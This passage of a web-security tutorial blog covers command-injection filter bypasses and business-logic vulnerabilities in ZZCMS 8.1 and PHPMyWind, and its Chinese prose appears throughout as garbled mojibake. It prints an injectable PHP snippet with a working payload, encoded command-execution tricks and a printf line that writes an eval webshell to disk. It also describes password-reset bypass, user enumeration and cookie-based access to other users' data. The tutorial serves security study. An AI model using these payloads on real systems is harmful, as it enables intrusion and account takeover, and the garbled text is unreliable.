<h3 id="èŠ±æ‹¬å·çš„å…¶ä»–ç”¨æ³•">èŠ±æ‹¬å·çš„å…¶ä»–ç”¨æ³•</h3>
<p>åœ¨Linux bashä¸­è¿˜å¯ä»¥ä½¿ç”¨<code>&#123;OS_COMMAND,ARGUMENT&#125;</code>æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200115164213.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h3 id="é»‘åå•ç»•è¿‡">é»‘åå•ç»•è¿‡</h3>
<h4 id="æ‹¼æ¥ç»•è¿‡">æ‹¼æ¥ç»•è¿‡</h4>
<p><code>a=l;b=s;$a$b</code></p>
<p>ç›´æ¥å‚è€ƒä¸€é“ä»£ç å®¡è®¡çš„<a href="http://139.224.220.67:30008/">é¢˜ç›®</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h2&gt;calc&lt;&#x2F;h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;&quot;;</span><br><span class="line">if(!empty($_GET))&#123;</span><br><span class="line">    $str&#x3D;$_GET[&quot;calc&quot;];</span><br><span class="line">    if(strpos($str,&quot;#&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">    if(strpos($str,&quot;&#96;&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">    if(strpos($str,&quot;flag&quot;)!&#x3D;&#x3D;false)</span><br><span class="line">        die;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;.&#x2F;index.php&quot;&gt;</span><br><span class="line">input: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;calc&quot; value&#x3D;&quot;&lt;?php echo $str;?&gt;&quot;&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    echo &quot;result:&quot;.shell_exec(&quot;echo $str | bc&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè¿‡æ»¤äº†&quot;#ã€`â€œå’Œ&quot;flagâ€</p>
<p>payloadï¼š<code>?calc=1;a=fl;b=ag;cat $a$b;1</code></p>
<p>ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡flagï¼Œç”¨<code>;</code>ç»•è¿‡<code>| bc</code></p>
<h4 id="ç¼–ç ç»•è¿‡">ç¼–ç ç»•è¿‡</h4>
<p>base64ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo MTIzCg&#x3D;&#x3D;|base64 -d å…¶å°†ä¼šæ‰“å°123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64-d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>hexï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<p>octï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$(printf &quot;\154\163&quot;) &#x3D;&#x3D;&gt;ls</span><br><span class="line">$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">&#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br><span class="line">#å¯ä»¥é€šè¿‡è¿™æ ·æ¥å†™webshell,å†…å®¹ä¸º&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;</span><br><span class="line">$&#123;printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;&#125; &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
<h4 id="å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡">å•å¼•å·å’ŒåŒå¼•å·ç»•è¿‡</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&#39;&#39;t flag</span><br></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca&quot;&quot;t flag</span><br></pre></td></tr></table></figure>
<h4 id="åæ–œæ ç»•è¿‡">åæ–œæ ç»•è¿‡</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca\t fla\g</span><br></pre></td></tr></table></figure>
<h4 id="Shellç‰¹æ®Šå˜é‡ç»•è¿‡">Shellç‰¹æ®Šå˜é‡ç»•è¿‡</h4>
<table>
<thead>
<tr>
<th>å˜é‡</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody>
<tr>
<td>$0</td>
<td>å½“å‰è„šæœ¬çš„æ–‡ä»¶å</td>
</tr>
<tr>
<td>$n</td>
<td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ã€‚n æ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºç¬¬å‡ ä¸ªå‚æ•°ã€‚ä¾‹å¦‚ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯1ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯2ã€‚è€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚</td>
</tr>
<tr>
<td>$#</td>
<td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„å‚æ•°ä¸ªæ•°</td>
</tr>
<tr>
<td>$*</td>
<td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚</td>
</tr>
<tr>
<td>$@</td>
<td>ä¼ é€’ç»™è„šæœ¬æˆ–å‡½æ•°çš„æ‰€æœ‰å‚æ•°ï¼Œè€Œå‚æ•°ä¸å­˜åœ¨æ—¶å…¶å€¼ä¸ºç©ºã€‚è¢«åŒå¼•å·åŒ…å«æ—¶ï¼Œä¸$*ç¨æœ‰ä¸åŒ</td>
</tr>
<tr>
<td>$?</td>
<td>ä¸Šä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œæˆ–å‡½æ•°çš„è¿”å›å€¼</td>
</tr>
<tr>
<td>$$</td>
<td>å½“å‰shellè¿›ç¨‹ID</td>
</tr>
</tbody>
</table>
<p>æ¯”å¦‚ï¼š<code>ca$@t fla$@g</code></p>
<h4 id="é•¿åº¦é™åˆ¶">é•¿åº¦é™åˆ¶</h4>
<p><a href="https://www.freebuf.com/articles/web/154453.html">https://www.freebuf.com/articles/web/154453.html</a></p>
<blockquote>
<p>çœ‹è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å¯¹<code>*v</code>ä¸ºä»€ä¹ˆç­‰ä»·äº<code>rev v</code>å¾ˆç–‘æƒ‘ï¼Œåæ¥çŸ¥é“äº†Bash æ¥æ”¶åˆ°å‘½ä»¤ä»¥åï¼Œå‘ç°é‡Œé¢æœ‰é€šé…ç¬¦ï¼Œä¼šè¿›è¡Œé€šé…ç¬¦æ‰©å±•ï¼Œç„¶åå†æ‰§è¡Œå‘½ä»¤ã€‚ä¹Ÿå°±æ˜¯*vå…ˆæ‰©å±•ä¸º<code>rev v</code>ç„¶åå†æ‰§è¡Œã€‚</p>
</blockquote>
<h4 id="é€šé…ç¬¦">é€šé…ç¬¦</h4>
<p>æœ‰å…³å‘½ä»¤é€šé…ç¬¦çš„æ•™ç¨‹ï¼š<a href="http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html">http://www.ruanyifeng.com/blog/2018/09/bash-wildcards.html</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>å‘½ä»¤æ‰§è¡Œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹é€»è¾‘æ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹é€»è¾‘æ¼æ´åˆ©ç”¨">Webå®‰å…¨å­¦ä¹ ä¹‹é€»è¾‘æ¼æ´åˆ©ç”¨</h1>
<h2 id="é€»è¾‘æ¼æ´æ¦‚è¿°">é€»è¾‘æ¼æ´æ¦‚è¿°</h2>
<p>ç”±äºç¨‹åºé€»è¾‘ä¸ä¸¥è°¨æˆ–é€»è¾‘å¤ªè¿‡å¤æ‚ï¼Œå¯¼è‡´ä¸€äº›é€»è¾‘åˆ†æ”¯ä¸èƒ½æ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ï¼Œç»Ÿç§°ä¸ºä¸šåŠ¡é€»è¾‘æ¼æ´ã€‚å¸¸è§çš„é€»è¾‘æ¼æ´æœ‰äº¤æ˜“æ”¯ä»˜ã€å¯†ç ä¿®æ”¹ã€å¯†ç æ‰¾å›ã€è¶Šæƒä¿®æ”¹ã€è¶ŠæƒæŸ¥è¯¢ã€çªç ´é™åˆ¶ç­‰ï¼Œä¸‹å›¾æ˜¯ç®€å•çš„é€»è¾‘æ¼æ´æ€»ç»“ï¼Œåœ¨æŒ–æ˜çš„è¿‡ç¨‹ä¸­æ›´å¤šçš„æ—¶å€™éœ€è¦è„‘æ´å¤§å¼€ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121125603.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æŒ–æ˜é€»è¾‘æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œéœ€è¦ä¸€äº›æŠ€å·§å’Œéå¸¸è§„æ€è·¯ï¼Œæœ‰ç‚¹åƒè¾¹ç¼˜æµ‹è¯•çš„æ€æƒ³ã€‚ä¸€èˆ¬çš„æ€è·¯æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ç¡®å®šä¸šåŠ¡æµç¨‹---&gt;å¯»æ‰¾æµç¨‹ä¸­å¯ä»¥è¢«æ“æ§çš„ç¯èŠ‚---&gt;åˆ†æå¯è¢«æ“æ§ç¯èŠ‚ä¸­å¯èƒ½äº§ç”Ÿçš„é€»è¾‘é—®é¢˜---&gt;å°è¯•ä¿®æ”¹å‚æ•°è§¦å‘é€»è¾‘é—®é¢˜</span><br></pre></td></tr></table></figure>
<h2 id="é€»è¾‘æ¼æ´åˆ†ç±»">é€»è¾‘æ¼æ´åˆ†ç±»</h2>
<ul>
<li>
<p>é¥®æ–™è´©å–æœº</p>
<ul>
<li>æ›¿æ¢è®¢å•IDï¼Œåˆ›å»ºè®¢å•æ—¶åœ¨æ”¯ä»˜ç•Œé¢ï¼Œåœ¨æ­¤åˆ›å»ºè®¢å•æ›¿æ¢è®¢å•IDï¼ˆé«˜ä»·æ›¿æ¢ä½ä»·ï¼‰</li>
<li>æ— é™æ–°ç”¨æˆ·ä¼˜æƒ è®¢å•ï¼Œé‡å¤åˆ›å»ºä¼˜æƒ è®¢å•</li>
<li>æ›¿æ¢ä¼˜æƒ å·IDï¼ˆæœªè¾¾åˆ°æ¡ä»¶ä½¿ç”¨ï¼‰</li>
<li>ä¸ªåˆ«æƒ…å†µè®¢å•æ•°é‡ä¸º1.99æ—¶ï¼Œå®¢æˆ·ç«¯åªæ”¯ä»˜1å…ƒï¼Œå®é™…ä¸ŠæœåŠ¡å™¨è®¤ä¸ºæ”¯ä»˜äº†2å…ƒã€‚</li>
<li>å–è´§æ—¶å¹¶å‘ï¼ˆçœŸå®æ¡ˆä¾‹ï¼‰</li>
</ul>
</li>
<li>
<p>ç›´æ’­</p>
<ul>
<li>å¿«é€Ÿè¿›å‡ºæˆ¿é—´ç‚¸æˆ¿</li>
<li>æ— é™å‘é€ç‚¹èµåè®®</li>
<li>ä¿®æ”¹ç¤¼ç‰©æ•°é‡ï¼Œ0ï¼Œå°æ•°ï¼Œè´Ÿæ•°ï¼Œç‰¹å®šå€¼ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ä¸º1073741824ï¼‰</li>
<li>ä¿®æ”¹ç¤¼ç‰©IDï¼Œéå†å°è¯•æ˜¯å¦æœ‰éšè—IDã€‚</li>
<li>å¹¶å‘é€ç¤¼ç‰©ï¼ŒæŠ½å¥–</li>
<li>æ— é™åˆ›å»ºé¦–æ¬¡ä¼˜æƒ è®¢å•ï¼Œæœ‰äº›é¦–æ¬¡ä¼˜æƒ è®¢å•æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„pidï¼Œè¿™ç§çš„ç›´æ¥æ›¿æ¢pidè¿›è¡Œæ”¯ä»˜ã€‚æœ‰äº›æ˜¯ç›¸åŒçš„IDï¼Œè¿™ç§çš„æå‰åˆ›å»ºè®¢å•ï¼Œè®°å½•å¤šä¸ªè®¢å•å·åœ¨ä¾æ¬¡ä¿®æ”¹è®¢å•æ”¯ä»˜ã€‚</li>
<li>åˆ·å±ï¼šå‘è¨€åˆ·å±ï¼Œåˆ†äº«ï¼Œç‚¹èµç­‰æœ‰æç¤ºçš„åœ°æ–¹åˆ·å±</li>
<li>æˆ¿é—´å†…å¯ä»¥ç”³è¯·çš„åœ°æ–¹è¿›è¡Œç”³è¯·å–æ¶ˆæ“ä½œï¼Œçœ‹çœ‹æ˜¯å¦èƒ½ç‚¸æˆ¿ã€‚</li>
<li>è¶Šæƒè¸¢äººï¼Œå¢åŠ ç®¡ç†å‘˜ï¼Œå…³é—­æˆ¿é—´ç­‰æ“ä½œã€‚</li>
<li>å‘é€çš„è¡¨æƒ…æ˜¯å¦å¯ä»¥ä¿®æ”¹é•¿å®½ï¼ˆçœŸå®æ¡ˆä¾‹ï¼‰</li>
</ul>
</li>
<li>
<p>è´­ç‰©app</p>
<ul>
<li>è´­ä¹°æ•°é‡ï¼šä¸º0ï¼Œå°æ•°ï¼Œè´Ÿæ•°ï¼Œæ­£è´Ÿå€¼ï¼ˆAä¸º-1ï¼ŒBä¸º2ï¼Œæ€»å€¼ä¸º1ï¼‰</li>
<li>ä»£é‡‘å·ï¼šå¹¶å‘é¢†å–ï¼Œéå†é¢†å–ï¼ŒåŒä¸€ä¸ªä»£é‡‘å·é‡å¤ä½¿ç”¨ï¼Œæœªæ»¡è¶³æ¡ä»¶ä½¿ç”¨ä»£é‡‘å·</li>
<li>è¶Šæƒï¼šç™»é™†ï¼Œæ“ä½œåˆ«äººè®¢å•ï¼Œä¿®æ”¹èµ„æ–™</li>
</ul>
</li>
<li>
<p>å¤–å–</p>
<ul>
<li>å•†å“æ•°é‡ï¼Œ0ï¼Œè´Ÿæ•°ï¼Œå°æ•°ï¼Œç‰¹å®šå€¼ï¼Œæ­£è´Ÿæ•°ï¼ˆAä¸º-1ï¼ŒBä¸º2ï¼Œæ€»å€¼ä¸º1ï¼‰</li>
<li>é€é¤å‘˜è¯„ä»·ä¿®æ”¹ï¼Œæ˜Ÿçº§ï¼Œæ‰“èµé‡‘é¢ï¼ˆå°æ•°ï¼Œè´Ÿæ•°ï¼‰</li>
<li>å•†å“è¯„ä»·ï¼Œæ˜Ÿçº§ï¼Œè¯„è®ºå­—æ•°ï¼Œä¸Šä¼ å›¾ç‰‡æ˜¯å¦å¯ä»¥è‡ªå®šä¹‰æ ¼å¼ï¼Œ</li>
<li>è®¢å•è¶…å‡ºé€é¤åœ°å€</li>
<li>å¼ºè¡Œè´§åˆ°ä»˜æ¬¾ï¼Œå–æ¶ˆè®¢å•ï¼Œé€€æ¬¾</li>
<li>è¶Šæƒæ“ä½œåˆ«äººè®¢å•ï¼Œç™»é™†</li>
<li>ä¼˜æƒ è´­ä¹°ä¼šå‘˜ï¼ˆé‡å¤ä½¿ç”¨ä¼˜æƒ è´­ä¹°ï¼‰</li>
</ul>
</li>
<li>
<p>äº¤æ˜“å¹³å°</p>
<ul>
<li>é’±åŒ…å¹¶å‘æç°ï¼Œè´Ÿæ•°æç°</li>
<li>ä½¿ç”¨é’±åŒ…æ”¯ä»˜æ—¶å¤šä¸ªè®¢å•å¹¶å‘æ”¯ä»˜ï¼ˆæ˜¯å¦æ”¯ä»˜é‡‘é¢èƒ½å¤§äºä½™é¢ï¼‰</li>
<li>è½¬è´¦è´Ÿæ•°ï¼Œå¹¶å‘è½¬è´¦</li>
<li>ä¸Šæ¶å•†å“çªç ´é™åˆ¶ï¼Œä¾‹å¦‚æ•°é‡ï¼Œå­—æ•°ã€‚</li>
<li>æ›¿æ¢è®¢å•ï¼Œåˆ›å»ºè®¢å•å·å¦‚æœè®¢å•çŠ¶æ€å¯ä¿®æ”¹ï¼Œå…ˆè¿›åˆ°æ”¯ä»˜ç•Œé¢ï¼Œç„¶åå°†è®¢å•ä¿®æ”¹æˆæ›´å¤§çš„é‡‘é¢ï¼Œç„¶åæ”¯ä»˜æå‰è¿›å…¥çš„æ”¯ä»˜ç•Œé¢</li>
<li>æ•°é‡ä¿®æ”¹</li>
</ul>
</li>
<li>
<p>ç¤¾äº¤</p>
<ul>
<li>å¼ºè¡Œä¸¾æŠ¥ï¼ˆè¯»å–æœ¬åœ°æ¶ˆæ¯ä¸Šä¼ é‚£ç§ï¼‰</li>
<li>å¼ºè¡ŒåŠ å¥½å‹ï¼ˆä¸€èˆ¬å°è¯•é‡å‘é€šè¿‡å¥½å‹è¿™æ¡åè®®ï¼‰</li>
<li>è‡ªç”±ä¿®æ”¹å·ç ï¼ˆé“å·ç±»ï¼‰</li>
<li>ç¾¤ç®¡ç†æ— é™ç¦è¨€</li>
<li>è¶Šæƒç¦è¨€ï¼Œæ›¿äººï¼Œæ‹‰é»‘</li>
<li>ä¼šå‘˜ä¿®æ”¹é‡‘é¢ï¼Œæ•°é‡ã€‚æ— é™ä¼˜æƒ è´­ä¹°</li>
<li>éä¼šå‘˜ä½¿ç”¨ä¼šå‘˜åŠŸèƒ½</li>
</ul>
</li>
<li>
<p>æ¼«ç”»</p>
<ul>
<li>æ‰“èµé‡‘é¢ä¸ºè´Ÿæ•°ï¼Œå°æ•°ï¼Œç‰¹å®šå€¼ï¼ˆæº¢å‡ºï¼‰</li>
<li>è¶Šæƒåˆ é™¤è¯„è®ºï¼Œç™»é™†</li>
<li>ä¿®æ”¹å……å€¼é‡‘é¢</li>
<li>ä»˜è´¹æ¼«ç”»å…è´¹çœ‹</li>
<li>è¯„è®ºå›¾ç‰‡æ•°é‡è¿‡å¤šä¼šå¯¼è‡´å®¢æˆ·ç«¯åŠ è½½å¡æ­»</li>
</ul>
</li>
<li>
<p>éŸ³ä¹</p>
<ul>
<li>å”±æ­Œç±»è½¯ä»¶ä¿®æ”¹ä¸Šä¼ åˆ†æ•°ç­‰å‚æ•°</li>
<li>ä»˜è´¹ä¸‹è½½å°è¯•æ›¿æ¢ä¸‹è½½ID</li>
<li>ä¿®æ”¹ä»˜è´¹ä¸‹è½½é‡‘é¢</li>
<li>F12æŸ¥çœ‹ä¸‹æ˜¯å¦æœ‰æ­Œæ›²åœ°å€</li>
</ul>
</li>
<li>
<p>ç½‘çº¦è½¦</p>
<ul>
<li>æ— é™å«è½¦ï¼Œé‡å¤å‘é€åè®®é€ æˆå¸‚åœºæ··ä¹±</li>
<li>ä¿®æ”¹è¯„ä»·åˆ†æ•°</li>
<li>ä¿®æ”¹é™æ—¶ä¼˜æƒ å«è½¦å…³é”®å‚æ•°</li>
<li>æ›¿æ¢ä¼˜æƒ å·</li>
<li>è¶Šæƒæ“ä½œå…¶ä»–è®¢å•</li>
</ul>
</li>
</ul>
<p>ä¸šåŠ¡é€»è¾‘æ¼æ´éœ€è¦å¯¹ä¸šåŠ¡ç†Ÿæ‚‰ï¼Œæœ‰å¾ˆå¼ºçš„é€»è¾‘æ€ç»´èƒ½åŠ›ï¼Œæ‰€ä»¥ä¸‹é¢ä¸»è¦æè¿°ä¸€ä¸‹ZZCMS8.1ä¸­æ³¨å†Œã€ç™»å½•å’Œå¯†ç æ‰¾å›å‡ºç°çš„æ¼æ´é€»è¾‘ï¼Œå†å°½é‡å¤šå’Œå…¨çš„æ”¶é›†æ•´ç†ç›¸å…³åœºæ™¯ã€‚</p>
<h2 id="é€»è¾‘æ¼æ´åˆ©ç”¨å®ä¾‹">é€»è¾‘æ¼æ´åˆ©ç”¨å®ä¾‹</h2>
<h3 id="ZZCMS-8-1">ZZCMS 8.1</h3>
<h4 id="æ‰¹é‡æ³¨å†Œ">æ‰¹é‡æ³¨å†Œ</h4>
<p>æˆ‘ä»¬æŠŠæ³¨å†ŒåŠŸèƒ½å¡«å†™ç›¸å…³ä¿¡æ¯ï¼Œç„¶åæŠ“åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174113.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>å°†æ•°æ®åŒ…å‘é€åˆ°repeaterï¼Œæ¯æ¬¡ä¿®æ”¹usernameå€¼ï¼Œå‘ç°ï¼Œåªéœ€è¦ä¿®æ”¹usernameå€¼å°±å¯ä»¥æ³¨å†ŒæˆåŠŸç”¨æˆ·ï¼Œå›¾å½¢éªŒè¯ç æ— æ•ˆï¼Œå¹¶ä¸”æœªå¯¹ç”µè¯ï¼Œé‚®ç®±ç­‰ä¿¡æ¯æ ¡éªŒï¼Œå¯æ‰¹é‡æ³¨å†Œã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174335.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121174408.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h4 id="æ‰¹é‡çŒœè§£ç”¨æˆ·">æ‰¹é‡çŒœè§£ç”¨æˆ·</h4>
<p>åŒæ ·æ˜¯æ³¨å†ŒåŠŸèƒ½ï¼Œåœ¨è¾“å…¥ç”¨æˆ·åæ—¶ï¼Œå‘ç°ä¼šæç¤ºç”¨æˆ·åæ˜¯å¦å­˜åœ¨ï¼ŒçŒœæµ‹è¯¥ä½ç½®å¯ä»¥çŒœæµ‹å“ªäº›ç”¨æˆ·æ³¨å†Œè¿‡è¯¥ç½‘ç«™ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121192039.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>æŠ“å–è¯¥ä½ç½®æ•°æ®åŒ…å‘ç°ï¼Œä¼šå¯¹ç”¨æˆ·åidè¿›è¡Œåˆ¤æ–­ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œæ˜¯å¦ç¬¦åˆè§„åˆ™ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥æ‰¹é‡æ¢æµ‹ç”¨æˆ·ï¼Œå‘ç°å¯ä»¥æ‰¹é‡æ¢æµ‹å·²æ³¨å†Œè¿‡çš„ç”¨æˆ·ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121191345.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h4 id="ä»»æ„å¯†ç é‡ç½®">ä»»æ„å¯†ç é‡ç½®</h4>
<p>åœ¨å¿˜è®°å¯†ç åŠŸèƒ½ï¼Œæˆ‘ä»¬è¾“å…¥ç”¨æˆ·åæ­£ç¡®åä¼šè¿›è¡ŒçŸ­ä¿¡éªŒè¯ç ï¼Œé€šè¿‡æ‰‹æœºéªŒè¯ç æˆ–è€…é‚®ç®±éªŒè¯ç ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121214403.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>åœ¨éªŒè¯ç åŠŸèƒ½ä¸­è¾“å…¥éªŒè¯ç è¿›è¡ŒéªŒè¯ï¼Œå‘ç°å…¶ä¸­æœ‰ä¸€æ®µJavaScriptä»£ç <code>document.userreg.yzm_mobile2.value=='no'</code>æ˜¯ç”¨æ¥éªŒè¯éªŒè¯ç æ˜¯å¦æ­£ç¡®ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥åœ¨æ§åˆ¶å°ç›´æ¥æ”¹å˜è¿™ä¸ªå€¼å°±å¯ä»¥ç»•è¿‡éªŒè¯ç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200121221300.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200121221556274.png" alt="image-20200121221556274"></p>
<h4 id="å¹³è¡Œè¶Šæƒ">å¹³è¡Œè¶Šæƒ</h4>
<blockquote>
<p>è¶Šæƒåˆå¯åˆ†ä¸ºå¹³è¡Œè¶Šæƒï¼ˆç›¸åŒç”¨æˆ·ï¼‰ã€å‚ç›´è¶Šæƒï¼ˆä½æƒé™ç”¨æˆ·å’Œé«˜æƒé™ç”¨æˆ·ï¼‰ã€æœªæˆæƒè®¿é—®ï¼ˆæ— éœ€ç”¨æˆ·ç›´æ¥æ“ä½œï¼‰ã€‚</p>
</blockquote>
<p>ç™»å½•æ™®é€šç”¨æˆ·test2,æŸ¥çœ‹ç”¨æˆ·æ•æ„Ÿçš„é¡µé¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161744.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<p>å‘é€åˆ°repteateræ•°æ®åŒ…ä¸­ï¼Œçœ‹åˆ°cookieä¸­å­˜åœ¨usernameå‚æ•°ï¼Œä¿®æ”¹ä¸ºå·²å­˜åœ¨çš„ç”¨æˆ·åï¼Œå‘ç°è¿”å›åŒ…ä¸­å¯æŸ¥çœ‹å…¶ä»–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200122161815.png?x-oss-process=image/rounded-corners,r_10/watermark,type_ZmFuZ3poZW5naGVpdGk,size_40,text_Y2EwMWgudG9w,color_FFFFFF,shadow_30,t_100,g_se,x_10" alt=""></p>
<h3 id="PHPMyWind-5-5">PHPMyWind 5.5</h3>
<p>ç”±äºç½‘ä¸Šæ²¡æœ‰æ‰¾åˆ°PHPMyWind5.5çš„æºç ï¼Œåªèƒ½çœ‹çœ‹å…¶ä»–å¸ˆå‚…åˆ†æçš„æ–‡ç« ï¼Œè¿™é‡Œå°±å†å¤§æ¦‚å¤è¿°ä¸€éã€‚</p>
<p>é¦–å…ˆå¯¹å®éªŒç¯å¢ƒåšä¸€ä¸ªç®€å•è¯´æ˜ï¼š</p>
<table>
<thead>
<tr>
<th>æœåŠ¡å™¨</th>
<th>192.168.114.159</th>
<th>éƒ¨ç½²æœ‰â€œPHPMyWind 5.5â€</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ”»å‡»æœºï¼ˆsafedogï¼‰</td>
<td>192.168.114.1</td>
<td>éƒ¨ç½²æœ‰èƒ½â€œæ”¶é›†PHPMyWindç”¨æˆ·çš„Cookieâ€çš„PHPè„šæœ¬ã€JSè„šæœ¬</td>
</tr>
<tr>
<td>å—å®³è€…ï¼ˆvictimï¼‰</td>
<td>192.168.114.161</td>
